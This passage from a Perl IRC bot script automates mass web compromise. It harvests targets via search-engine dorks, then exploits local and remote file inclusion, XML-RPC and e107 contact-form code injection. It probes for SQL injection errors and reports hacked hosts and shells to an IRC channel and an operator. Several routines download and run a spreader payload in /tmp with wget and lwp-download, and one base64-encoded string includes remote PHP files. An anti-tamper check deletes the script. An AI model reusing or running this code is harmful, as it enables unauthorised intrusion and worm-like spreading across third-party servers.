        my @lfisnz=&snz($dork);
        push(@lfitotal, @lfisnz);
    }
    if ($engz =~ /gigablast/) {
        my @lfigigablast=&gigablast($dork);
        push(@lfitotal, @lfigigablast);
    }
    if ($engz =~ /tiscali/) {
        my @lfitiscali=&tiscali($dork);
        push(@lfitotal, @lfitiscali);
    }
	if ($engz =~ /Libero/) {
        my @lfilibero=&libero($dork);
        push(@lfitotal, @lfilibero);
    }
    if ($engz =~ /ixquic/) {
        my @lfiixquic=&ixquic($dork);
        push(@lfitotal, @lfiixquic);
    }
	if ($engz =~ /kvasir/) {
        my @lfikvasir=&kvasir($dork);
        push(@lfitotal, @lfikvasir);
    }
    if ($engz =~ /szukacz/) {
        my @lfiszukacz=&szukacz($dork);
        push(@lfitotal, @lfiszukacz);
    }
	if ($engz =~ /virgillio/) {
        my @lfivirgillio=&virgillio($dork);
        push(@lfitotal, @lfivirgillio);
    }
    if ($engz =~ /aol/) {
        my @lfiaol=&aol($dork);
        push(@lfitotal, @lfiaol);
    }
    my @lficlean = &calculate(@lfitotal);
    if (scalar(@clean) != 0) {
    }
    my $uni=scalar(@lficlean);
    foreach my $lfitarget (@lficlean)
    {
        $contatore++;
        if ($contatore==$uni-1){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9LFI4)8 Ok Brother,9 Scan Finish for14 $dork with 15 24 engine ");
        }
        my $lfi  = "../../../../../../../../../../../../../../../../../../../../../../../..";
        my $xpl  = "http://".$lfitarget.$bugz.$rspo_test;
        my $vuln = "http://".$lfitarget."12".$bugz."7".$rspo_test."";
        my $re   = getcontent($xpl);
        if ($re  =~ /DOCUMENT_ROOT=\// && $re =~ /HTTP_USER_AGENT/){
            if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                my $rspo = lfiexploit($xpl,"uname -svnrp;echo J13mb0T;id");
                $rspo =~ s/\n//g;
                if ($rspo =~ /j13mb0t#(.*)J13mb0Tuid=(.*)#j13mb0t/sg) {
                    my ($sys,$uid) = ($1,$2);
		    my $lfispread  = "cd /tmp;lwp-download $byroesprd -O php.jpg;perl php.jpg;rm -rf *.jpg*;wget $byroesprd -O php.jpg;perl php.jpg;rm -rf *.jpg*";
                    my $tmp = "/tmp/cmd".int rand(2010);
                    my $upload = lfiexploit($xpl,"wget $rfiid -O $tmp;$lfispread;$sixnergy"); sleep(1);
                    my $res = getcontent("http://".$lfitarget.$bugz.$lfi.$tmp.'%0000');
                    if ($res =~ /Hacked By aanK/) {
                        sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3LFI15)(4@3$engz15)15(13@12PHPSheLL15)4 http://".$lfitarget."12".$bugz."6".$lfi."7".$tmp."%0000 15(7@3".$sys."15)");
			sendraw($IRC_cur_socket, "PRIVMSG aanK 15(4@3LFI15)(4@3$engz15)15(13@12PHPSheLL15)4 http://".$lfitarget."12".$bugz."6".$lfi."7".$tmp."%0000 15(7@3".$sys."15)");
                    }
                    else {
                        sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3LFI15)(4@3$engz15)15(13@12System15)4 http://".$lfitarget."12".$bugz."6[LFI] 15(7@3".$sys." 7uid=".$uid."15)");
                    }
                }
                else {
                }
            } exit } sleep(3);
        }
    }
}

sub cmdxml() {
my $jed = $_[0];
my $dwa = $_[1];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'aanK';echo`".$dwa."`;echo'solo';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $jed,Content_Type => 'text/xml',Content => $exploit);
if ($response->content =~ /aanK(.*)solo/s) {
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3XMLCMD15)4 $1");
}
}

sub xmlscan() {
    my $engz = $_[0];
    my $bugz = $_[1];
    my $dork = $_[2];
    my $contatore = 0;    
    if ($engz =~ /GooGLe/) {
        my @xmlgoogle=&google($dork);
        push(@xmltotal, @xmlgoogle);
        }
    if ($engz =~ /AllTheWeb/) {
        my @xmlalltheweb=&alltheweb($dork);
        push(@xmltotal, @xmlalltheweb);
    }
    if ($engz =~ /Bing/) {
        my @xmlBing=&Bing($dork);
        push(@xmltotal, @xmlBing);
    }
    if ($engz =~ /ALtaViSTa/) {
        my @xmlaltavista=&altavista($dork);
        push(@xmltotal, @xmlaltavista);
    }
    if ($engz =~ /AsK/) {
        my @xmlask=&ask($dork);
        push(@xmltotal, @xmlask);
    }
    if ($engz =~ /UoL/) {
        my @xmluol=&uol($dork);
        push(@xmltotal, @xmluol);
    }
    if ($engz =~ /YahOo/) {
        my @xmlyahoo=&yahoo($dork);
        push(@xmltotal, @xmlyahoo);
    }
	if ($engz =~ /Lycos/) {
        my @xmllycos=&lycos($dork);
        push(@xmltotal, @xmllycos);
    }
	if ($engz =~ /GoodSearch/) {
        my @xmlgoodsearch=&goodsearch($dork);
        push(@xmltotal, @xmlgoodsearch);
    }
	if ($engz =~ /Onet/) {
        my @xmlonet=&onet($dork);
        push(@xmltotal, @xmlonet);
    }
    if ($engz =~ /SeznaM/) {
        my @xmlseznam=&seznam($dork);
        push(@xmltotal, @xmlseznam);
    }
	if ($engz =~ /Neti/) {
        my @xmlneti=&neti($dork);
        push(@xmltotal, @xmlneti);
    }
    if ($engz =~ /DiNo/) {
        my @xmldino=&dino($dork);
        push(@xmltotal, @xmldino);
    }
	if ($engz =~ /WitcH/) {
        my @xmlwitch=&witch($dork);
        push(@xmltotal, @xmlwitch);
    }
    if ($engz =~ /IlsE/) {
        my @xmlilse=&ilse($dork);
        push(@xmltotal, @xmlilse);
    }
	if ($engz =~ /snz/) {
        my @xmlsnz=&snz($dork);
        push(@xmltotal, @xmlsnz);
    }
    if ($engz =~ /gigablast/) {
        my @xmlgigablast=&gigablast($dork);
        push(@xmltotal, @xmlgigablast);
    }
    if ($engz =~ /tiscali/) {
        my @xmltiscali=&tiscali($dork);
        push(@xmltotal, @xmltiscali);
    }
	if ($engz =~ /Libero/) {
        my @xmllibero=&libero($dork);
        push(@xmltotal, @xmllibero);
    }
    if ($engz =~ /ixquic/) {
        my @xmlixquic=&ixquic($dork);
        push(@xmltotal, @xmlixquic);
    }
	if ($engz =~ /kvasir/) {
        my @xmlkvasir=&kvasir($dork);
        push(@xmltotal, @xmlkvasir);
    }
    if ($engz =~ /szukacz/) {
        my @xmlszukacz=&szukacz($dork);
        push(@xmltotal, @xmlszukacz);
    }
	if ($engz =~ /virgillio/) {
        my @xmlvirgillio=&virgillio($dork);
        push(@xmltotal, @xmlvirgillio);
    }
    if ($engz =~ /aol/) {
        my @xmlaol=&aol($dork);
        push(@xmltotal, @xmlaol);
	}
    my @xmlclean = &calculate(@xmltotal);
    if (scalar(@xmlclean) != 0) {
	}
    my $uni=scalar(@xmlclean);
    foreach my $xmltarget (@xmlclean)
    {
        $contatore++;
        if ($contatore==$uni-1){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9XML4)8 Ok Brother,9 Scan Finish for14 $dork with 15 24 engine ");
        }
        my $xpl = "http://".$xmltarget.$bugz;
		my $xmlsprd = "cd /tmp;lwp-download $byroesprd -O php.jpg;perl php.jpg;rm -rf *.jpg*;wget $byroesprd -O php.jpg;perl php.jpg;rm -rf *.jpg*";
        my $strona = getcontent($xpl);
        if ( $strona =~ /faultCode/ ) {
			xmlcek($xpl);
			xmlxspread($xpl,$xmlsprd);
			}
	}
}

sub rfiscan() {
    my $engz = $_[0];
    my $bugz = $_[1];
    my $dork = $_[2];
    my $contatore = 0;    
    if ($engz =~ /GooGLe/) {
        my @rfigoogle=&google($dork);
        push(@rfitotal, @rfigoogle);
        }
    if ($engz =~ /AllTheWeb/) {
        my @rfialltheweb=&alltheweb($dork);
        push(@rfitotal, @rfialltheweb);
    }
    if ($engz =~ /Bing/) {
        my @rfiBing=&Bing($dork);
        push(@rfitotal, @rfiBing);
    }
    if ($engz =~ /ALtaViSTa/) {
        my @rfialtavista=&altavista($dork);
        push(@rfitotal, @rfialtavista);
    }
    if ($engz =~ /AsK/) {
        my @rfiask=&ask($dork);
        push(@rfitotal, @rfiask);
    }
    if ($engz =~ /UoL/) {
        my @rfiuol=&uol($dork);
        push(@rfitotal, @rfiuol);
    }
    if ($engz =~ /YahOo/) {
        my @rfiyahoo=&yahoo($dork);
        push(@rfitotal, @rfiyahoo);
    }
	if ($engz =~ /Lycos/) {
        my @rfilycos=&lycos($dork);
        push(@rfitotal, @rfilycos);
    }
	if ($engz =~ /GoodSearch/) {
        my @rfigoodsearch=&goodsearch($dork);
        push(@rfitotal, @rfigoodsearch);
    }
	if ($engz =~ /Onet/) {
        my @rfionet=&onet($dork);
        push(@rfitotal, @rfionet);
    }
    if ($engz =~ /SeznaM/) {
        my @rfiseznam=&seznam($dork);
        push(@rfitotal, @rfiseznam);
    }
	if ($engz =~ /Neti/) {
        my @rfineti=&neti($dork);
        push(@rfitotal, @rfineti);
    }
    if ($engz =~ /DiNo/) {
        my @rfidino=&dino($dork);
        push(@rfitotal, @rfidino);
    }
	if ($engz =~ /WitcH/) {
        my @rfiwitch=&witch($dork);
        push(@rfitotal, @rfiwitch);
    }
	if ($engz =~ /ilse/) {
        my @rfiilse=&ilse($dork);
        push(@rfitotal, @rfiilse);
    }
	if ($engz =~ /snz/) {
        my @rfisnz=&snz($dork);
        push(@rfitotal, @rfisnz);
    }
    if ($engz =~ /gigablast/) {
        my @rfigigablast=&gigablast($dork);
        push(@rfitotal, @rfigigablast);
    }
    if ($engz =~ /tiscali/) {
        my @rfitiscali=&tiscali($dork);
        push(@rfitotal, @rfitiscali);
    }
	if ($engz =~ /Libero/) {
        my @rfilibero=&libero($dork);
        push(@rfitotal, @rfilibero);
    }
    if ($engz =~ /ixquic/) {
        my @rfiixquic=&ixquic($dork);
        push(@rfitotal, @rfiixquic);
    }
	if ($engz =~ /kvasir/) {
        my @rfikvasir=&kvasir($dork);
        push(@rfitotal, @rfikvasir);
    }
    if ($engz =~ /szukacz/) {
        my @rfiszukacz=&szukacz($dork);
        push(@rfitotal, @rfiszukacz);
    }
	if ($engz =~ /virgillio/) {
        my @rfivirgillio=&virgillio($dork);
        push(@rfitotal, @rfivirgillio);
    }
    if ($engz =~ /aol/) {
        my @rfiaol=&aol($dork);
        push(@rfitotal, @rfiaol);
	}
    my @rficlean = &calculate(@rfitotal);
    if (scalar(@rficlean) != 0) {
    }
    my $uni=scalar(@rficlean);
    foreach my $rfitarget (@rficlean)
    {
        $contatore++;
        if ($contatore==$uni-1){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :4(8@9RFI4)8 Ok Brother,9 Scan Finish for14 $dork with 15 24 engine ");
        }
        my $rfixpl  = "http://".$rfitarget.$bugz.$rfiid;
	my $inj	 = "http://".$rfitarget."12".$bugz."7[PHP-SHELL]?";
        my $re   = getcontent($rfixpl);
        if ($re  =~ /Hacked By aanK/){
			getcontent($rfispd);
			os($rfixpl);
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3RFI15)2$inj14 $os");
			sendraw($IRC_cur_socket, "PRIVMSG aanK :15(4@3RFI15)2$inj14 $os");
			}
	}
}
sub sqlscan() {
    my $engz = $_[0];
    my $bugz = $_[1];
    my $dork = $_[2];
    my $contatore = 0;    
    if ($engz =~ /GooGLe/) {
        my @sqlgoogle=&google($dork);
        push(@sqltotal, @sqlgoogle);
        }
    if ($engz =~ /AllTheWeb/) {
        my @sqlalltheweb=&alltheweb($dork);
        push(@sqltotal, @sqlalltheweb);
    }
    if ($engz =~ /Bing/) {
        my @sqlBing=&Bing($dork);
        push(@sqltotal, @sqlBing);
    }
    if ($engz =~ /ALtaViSTa/) {
        my @sqlaltavista=&altavista($dork);
        push(@sqltotal, @sqlaltavista);
    }
    if ($engz =~ /AsK/) {
        my @sqlask=&ask($dork);
        push(@sqltotal, @sqlask);
    }
    if ($engz =~ /UoL/) {
        my @sqluol=&uol($dork);
        push(@sqltotal, @sqluol);
    }
    if ($engz =~ /YahOo/) {
        my @sqlyahoo=&yahoo($dork);
        push(@sqltotal, @sqlyahoo);
    }
		if ($engz =~ /Lycos/) {
        my @sqllycos=&lycos($dork);
        push(@sqltotal, @sqllycos);
    }
	if ($engz =~ /GoodSearch/) {
        my @sqlgoodsearch=&goodsearch($dork);
        push(@sqltotal, @sqlgoodsearch);
    }
	if ($engz =~ /Onet/) {
        my @sqlonet=&onet($dork);
        push(@sqltotal, @sqlonet);
    }
    if ($engz =~ /SeznaM/) {
        my @sqlseznam=&seznam($dork);
        push(@sqltotal, @sqlseznam);
    }
	if ($engz =~ /Neti/) {
        my @sqlneti=&neti($dork);
        push(@sqltotal, @sqlneti);
    }
    if ($engz =~ /DiNo/) {
        my @sqldino=&dino($dork);
        push(@sqltotal, @sqldino);
    }
	if ($engz =~ /WitcH/) {
        my @sqlwitch=&witch($dork);
        push(@sqltotal, @sqlwitch);
    }
    if ($engz =~ /IlsE/) {
        my @sqlilse=&ilse($dork);
        push(@sqltotal, @sqlilse);
    }
	if ($engz =~ /snz/) {
        my @sqlsnz=&snz($dork);
        push(@sqltotal, @sqlsnz);
    }
    if ($engz =~ /gigablast/) {
        my @sqlgigablast=&gigablast($dork);
        push(@sqltotal, @sqlgigablast);
    }
    if ($engz =~ /tiscali/) {
        my @sqltiscali=&tiscali($dork);
        push(@sqltotal, @sqltiscali);
    }
	if ($engz =~ /Libero/) {
        my @sqllibero=&libero($dork);
        push(@sqltotal, @sqllibero);
    }
    if ($engz =~ /ixquic/) {
        my @sqlixquic=&ixquic($dork);
        push(@sqltotal, @sqlixquic);
    }
	if ($engz =~ /kvasir/) {
        my @sqlkvasir=&kvasir($dork);
        push(@sqltotal, @sqlkvasir);
    }
    if ($engz =~ /szukacz/) {
        my @sqlszukacz=&szukacz($dork);
        push(@sqltotal, @sqlszukacz);
    }
	if ($engz =~ /virgillio/) {
        my @sqlvirgillio=&virgillio($dork);
        push(@sqltotal, @sqlvirgillio);
    }
    if ($engz =~ /aol/) {
        my @sqlaol=&aol($dork);
        push(@sqltotal, @sqlaol);
	}
    my @sqlclean = &calculate(@sqltotal);
    if (scalar(@sqlclean) != 0) {
    }
    my $uni=scalar(@sqlclean);
    foreach my $sqltarget (@sqlclean)
    {
        $contatore++;
        if ($contatore==$uni-1){
        sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)(4@3$engz15)10 Scan Finish for14 $dork");
        }
        my $xpl = "http://".$sqltarget.$bugz."'";
		my $vuln = "http://".$sqltarget."12".$bugz."7[SQL]";
		my $sqlsite = "http://".$sqltarget.$bugz;
        my $strona = getcontent($xpl);
        if ( $strona =~ m/You have an error in your SQL syntax/i || $strona =~ m/Query failed/i || $strona =~ m/SQL query failed/i ) 
		{sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)(2MySQL15)14 $vuln ");&sqlbrute($sqlsite);}
		elsif ( $strona =~ m/ODBC SQL Server Driver/i || $strona =~ m/Unclosed quotation mark/i || $strona =~ m/Microsoft OLE DB Provider for/i )
		{sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)(2MsSQL15)14 $vuln ");}
		elsif ( $strona =~ m/Microsoft JET Database/i || $strona =~ m/ODBC Microsoft Access Driver/i )
		{sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3SQL15)(2MsAccess15)14 $vuln ");}
	}
}

sub cmde107() {
my $path = $_[0];
my $incmd = $_[1];
my $codecmd = encode_base64($incmd);
my $cmd = 'echo(base64_decode("QmFNYlk=").shell_exec(base64_decode("aWQ=")).base64_decode("Qnlyb2VOZXQ=")).shell_exec(base64_decode("'.$codecmd.'"))';
$access = new LWP::UserAgent;
$access->agent("Mozilla/5.0");
my $req = new HTTP::Request POST => $path;
   $req->content_type('application/x-www-form-urlencoded');
   $req->content("send-contactus=1&author_name=%5Bphp%5D".$cmd."%3Bdie%28%29%3B%5B%2Fphp%5D");
my $res = $access->request($req);
my $data = $res->as_string;
if ( $data =~ /ByroeNet(.*)/ ){
     $mydata = $1;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3e107CMD15)4 $mydata");
}
}
sub e107scan() {
    my $engz = $_[0];
    my $bugz = $_[1];
    my $dork = $_[2];
    my $contatore = 0;    
    if ($engz =~ /GooGLe/) {
        my @e107google=&google($dork);
        push(@e107total, @e107google);
        }
    if ($engz =~ /AllTheWeb/) {
        my @e107alltheweb=&alltheweb($dork);
        push(@e107total, @e107alltheweb);
    }
    if ($engz =~ /Bing/) {
        my @e107Bing=&Bing($dork);
        push(@e107total, @e107Bing);
    }
    if ($engz =~ /ALtaViSTa/) {
        my @e107altavista=&altavista($dork);
        push(@e107total, @e107altavista);
    }
    if ($engz =~ /AsK/) {
        my @e107ask=&ask($dork);
        push(@e107total, @e107ask);
    }
    if ($engz =~ /UoL/) {
        my @e107uol=&uol($dork);
        push(@e107total, @e107uol);
    }
    if ($engz =~ /YahOo/) {
        my @e107yahoo=&yahoo($dork);
        push(@e107total, @e107yahoo);
    }
		if ($engz =~ /Lycos/) {
        my @e107lycos=&lycos($dork);
        push(@e107total, @e107lycos);
    }
	if ($engz =~ /GoodSearch/) {
        my @e107goodsearch=&goodsearch($dork);
        push(@e107total, @e107goodsearch);
    }
	if ($engz =~ /Onet/) {
        my @e107onet=&onet($dork);
        push(@e107total, @e107onet);
    }
    if ($engz =~ /SeznaM/) {
        my @e107seznam=&seznam($dork);
        push(@e107total, @e107seznam);
    }
	if ($engz =~ /Neti/) {
        my @e107neti=&neti($dork);
        push(@e107total, @e107neti);
    }
    if ($engz =~ /DiNo/) {
        my @e107dino=&dino($dork);
        push(@e107total, @e107dino);
    }
	if ($engz =~ /WitcH/) {
        my @e107witch=&witch($dork);
        push(@e107total, @e107witch);
    }
    if ($engz =~ /IlsE/) {
        my @e107ilse=&ilse($dork);
        push(@e107total, @e107ilse);
    }
	if ($engz =~ /snz/) {
        my @e107snz=&snz($dork);
        push(@e107total, @e107snz);
    }
    if ($engz =~ /gigablast/) {
        my @e107gigablast=&gigablast($dork);
        push(@e107total, @e107gigablast);
    }
    if ($engz =~ /tiscali/) {
        my @e107tiscali=&tiscali($dork);
        push(@e107total, @e107tiscali);
    }
	if ($engz =~ /Libero/) {
        my @e107libero=&libero($dork);
        push(@e107total, @e107libero);
    }
    if ($engz =~ /ixquic/) {
        my @e107ixquic=&ixquic($dork);
        push(@e107total, @e107ixquic);
    }
	if ($engz =~ /kvasir/) {
        my @e107kvasir=&kvasir($dork);
        push(@e107total, @e107kvasir);
    }
    if ($engz =~ /szukacz/) {
        my @e107szukacz=&szukacz($dork);
        push(@e107total, @e107szukacz);
    }
	if ($engz =~ /virgillio/) {
        my @e107virgillio=&virgillio($dork);
        push(@e107total, @e107virgillio);
    }
    if ($engz =~ /aol/) {
        my @e107aol=&aol($dork);
        push(@e107total, @e107aol);
	}
    my @e107clean = &calculate(@e107total);
    if (scalar(@e107clean) != 0) {
    }
    my $uni=scalar(@e107clean);
    foreach my $e107target (@e107clean)
    {
        $contatore++;
        if ($contatore==$uni-1){
            sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3e10715)(4@3$engz15)10 Scan Finish for14 $dork with 15 24 engine ");
        }
		my $cmd = "echo(base64_decode(\"Vm9v\").php_uname().base64_decode(\"RG9v\"));include(base64_decode(\"aHR0cDovL3d3dy52aW5jZW50dHJhY3RvcnMuY28udWsvaW1hZ2VzL25ldy9wYm90LnR4dD8=\"));include(base64_decode(\"aHR0cDovL3d3dy52aW5jZW50dHJhY3RvcnMuY28udWsvaW1hZ2VzL25ldy9teXNwLnR4dD8=\"));";
		my $ua = LWP::UserAgent->new or die;
		$ua->agent('Mozilla/4.76 [ru] (X11; U; SunOS 5.7 sun4u)');
		$ua->timeout(15);
		my $xpl = "http://".$e107target."/contact.php";
		$xpl =~ s/\/\/contact.php/\/contact.php/g;
		my $req = HTTP::Request->new(POST => $xpl);
		$req->content_type('application/x-www-form-urlencoded');
		$req->content("send-contactus=1&author_name=%5Bphp%5D".$cmd."%3Bdie%28%29%3B%5B%2Fphp%5D");
		my $res = $ua->request($req);
		my $cont = $res->content;
			if ($cont =~ /Voo(.*)Doo/) {
				my $uname = $1;
				$uname=~s/\n//;
				$uname=~s/\r//;
				sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3e10715)(2$xpl15)14 $uname ");
			}
	}
}
sub enc()
{
   my $md5_hash = $1;
   my $md5_generated = md5_hex($md5_hash);
   sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3md5 Encode15)2 $md5_generated");
}
sub dec()
{
   my $md5 = $1;
   my $crac = 'http://md5.noisette.ch/md5.php?hash='.$md5;
   my $found = getcontent($crac);
      if 	($found =~ /<string><!\[CDATA\[(.*)\]\]><\/string>/)
			{
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3md5 Decode15)2 $1");
			}
      else 
			{
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3md5 Decode15)2 $1");
			}
}
sub xmlcek {
my $xmltgt = $_[0];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'j13mb0t';echo`uname -a`;echo'j13mb0t';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $xmltgt, Content_Type => 'text/xml', Content => $exploit);
if ($response->content =~ /j13mb0t(.*)j13mb0t/s) {
$os=$1;
sendraw($IRC_cur_socket, "PRIVMSG $channel :15(4@3XML15)(2$xmltgt15)14 $os ");
sendraw($IRC_cur_socket, "PRIVMSG aanK :15(4@3XML15)(2$xmltgt15)14 $os ");
}}
sub xmlxspread() {
my $xmltargt = $_[0];
my $xmlsprd = $_[1];
my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'j13m';echo`".$xmlsprd."`;echo'b0T';exit;/*</name></value></param></params></methodCall>";
my $response = $userAgent->request(POST $xmltargt, Content_Type => 'text/xml', Content => $exploit);
}

sub getcontent() {
    my $url = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(15);
    my $response = $ua->request($req);
    return $response->content;
}

sub lfiexploit() {
    my $url = $_[0];
    my $rce = $_[1];
    my $agent = "<?php echo \"j13mb0t#\"; passthru(\'".$rce."\'); echo \"#j13mb0t\"; ?>";
    my $ua = LWP::UserAgent->new(agent => $agent);
    $ua->timeout(15);
    my $req = HTTP::Request->new(GET => $url);
    my $response = $ua->request($req);
    return $response->content;
}

sub google(){
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=0; $b<=1000; $b+=100){
        my $Go=("http://www.google.com/search?q=".key($key)."&num=100&filter=0&start=".$b);
        my $Res=query($Go);
        while ($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
            if ($1 !~ /google/){
                my $k= $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
return @lst;
}

############################################################################################### 
sub SIGN() {
if (($powered !~ /aa/)||($mail !~ /tifa/)) {     
print "\nLamer!!! Bodoh ToloL Oon !!! Udah Gak Usah diRubah Lagi!!!\n\n"; 
exec("rm -rf $0 && pkill perl");
}
}

sub alltheweb() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    my $pg  = 0;
    for ($b=0; $b<=1000; $b+=100) {
        my $all = ("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$b);
        my $Res = query($all);
        while ( $Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g ) {
            my $k = $1;
            $k =~ s/ //g;
            my @grep = links($k);
            push( @lst, @grep );
        }
    }
    return @lst;
}

sub uol() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=1000; $b+=10) {
        my $UoL = ("http://mundo.busca.uol.com.br/buscar.html?q=".key($key)."&start=".$b);
        my $Res = query($UoL);
        while ( $Res =~ m/<a href=\"http:\/\/([^>\"]*)/g ) {
            my $k = $1;
            if ( $k !~ /busca|uol|yahoo/ ) {
                my $k    = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub Bing() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=1000; $b+=10) {
        my $bing = ("http://www.bing.com/search?q=".key($key)."&filt=all&first=".$b."&FORM=PERE");
        my $Res = query($bing);
        while ( $Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g ) {
            if ( $1 !~ /msn|live|bing/ ) {
                my $k    = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub altavista(){
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=1000; $b+=10){
        my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
        my $Res=query($AlT);
        while ($Res=~m/<span class=ngrn>(.+?)\//g){
            if ($1 !~ /altavista/){
                my $k=$1;
                $k=~s/<//g;
                $k=~s/ //g;
                my @grep=links($k);
                push(@lst,@grep);
            }
        }
    }
return @lst;
}

sub ask() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    my $pg  = 0;
    for ($b=0; $b<=1000; $b+=10) {
        my $Ask = ("http://it.ask.com/web?q=".key($key)."&o=0&l=dir&qsrc=0&qid=EE90DE6E8F5370F363A63EC61228D4FE&dm=all&page=".$b);
        my $Res = query($Ask);
        while ($Res =~ m/href=\"http:\/\/(.+?)\" onmousedown=/g) {
            if ($1 !~ /ask.com/){
                my $k = $1;
                my @grep = links($k);
                push( @lst, @grep );
            }
        }
    }
    return @lst;
}

sub yahoo() {
    my @lst;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=500; $b+=1) {
        my $yahoo = ("http://www.search.yahoo.com/search?p=".key($key)."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$b);
        my $Res = query($yahoo);
        while ($Res =~ m/26u=(.*?)%26w=/g) {
            if ($1 !~ /yahoo/){
                my $k = $1;
                my @grep = links($k);
                push(@lst, @grep);
            }
        }
    }
    return @lst;
}

sub lycos() {
	my @lst;
	my $key = $_[0];
    my $b   = 0;
	for ($b=0; $b<=1000; $b+=10) {
        my $lyc = ("http://cerca.lycos.it/cgi-bin/pursuit?pag=".$b."&query=".key($key)."&cat=web&enc=utf-8");
        my $Res = query($lyc);
        while ($Res =~ m/href=\"http:\/\/(.+?)\"  >/g) {
            if ($1 !~ /lycos/){
                my $k = $1;
                my @grep = links($k);
                push(@lst, @grep);
            }
        }
    }
    return @lst;
}

sub goodsearch() {
	my @lst;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=1000; $b+=10) {
        my $goods = ("http://www.goodsearch.com/search.aspx?keywords=".key($key)."&page=".$b."&osmax=0");
        my $Res = query($goods);
        while ($Res =~ m/<a href=\"(Redirect.+?)\">http:\/\/(.*?)<\/a>/g) {
            if ($2 !~ /goodsearch/){
                my $k = $2;
                my @grep = links($k);
                push(@lst, @grep);
            }
        }
    }
    return @lst;
}

sub onet(){
	my @lst;
	my $key = $_[0];
	my $b   = 0;
	for($b=0; $b<=500; $b+=10) {
		my $onet = ("http://szukaj.onet.pl/query.html?qt=".key($key)."&p=".$b);
		my $Res = query($onet);
		while($Res =~ m/<span class=\"?clurl\"?>http:\/\/(.+?)\//g){
			if ($1 !~ /Onet/){
				my $k = $1;
				my @grep = links($k);
				push(@lst, @grep);
			}
		}
	}
	return @lst;
}

sub seznam() {
    my @lst;
    my $key = $_[0];
	my $b   = 0;
    for ($b=1; $b<=500; $b+=10) {
        my $search = ("http://search.seznam.cz/?q=".key($key)."&from=".$b);
        my $res = query($search);
        while ($Res =~ m/<a href=\"http:\/\/(.+?)\/\" title=/g) {
			if ($1 !~ /SeznaM/){
				my $k = $1;
				my @grep = links($k);
				push(@lst, @grep);
			}
		}
	}	
	return @list;
}

sub neti() {
	my @lst;
	my $key = $_[0];
	my $b   = 0;
	for($b=1; $b<=1000; $b+=10) {
		my $neti = ("http://www.neti.ee/cgi-bin/otsing?query=".key($key)."&src=web&alates=".$b);
		my $Res = query($neti);
		while($Res =~ m/<a href=\"http:\/\/(.+?)\/\" target=/g){
			if ($1 !~ /neti/){
				my $k = $1;
				my @grep = links($k);
				push(@lst, @grep);
			}
		}
	}	
	return @lst;
}

sub dino(){
	my @lst;
	my $key = $_[0];
	my $b   = 0;
	for($b=1; $b<=500; $b+=10){
		my $dino = ("http://www.dino-online.de/suchergebnis.html?query=".key($key)."&page=".$b);
		my $Res = query($dino);
		while($Res =~ m/window.status='http:\/\/(.+?)\//g){
			if ($1 !~ /neti/){
				my $k = $1;
				my @grep = links($k);
				push(@lst, @grep);
			}
		}
	}	
	return @lst;
}

sub witch(){
	my @lst;
	my $key = $_[0];
	my $b   = 0;
	for($b=1; $b<=1000; $b+=10){
		my $witch = ("http://www.witch.de/search-result.php?searchtype=phonetisch&search=".key($key)."&cn=".$b);
		my $Res = query($witch);
		while($Res =~ m/window.status='http:\/\/(.+?)\//g){
			if ($1 !~ /witch/){
				my $k = $1;
				my @grep = links($k);
				push(@lst, @grep);
			}
		}
	}	
	return @lst;
}

sub ilse(){
	my @lst;
	my $key = $_[0];
	my $b   = 0;
	for($b=1; $b<=1000; $b+=10){
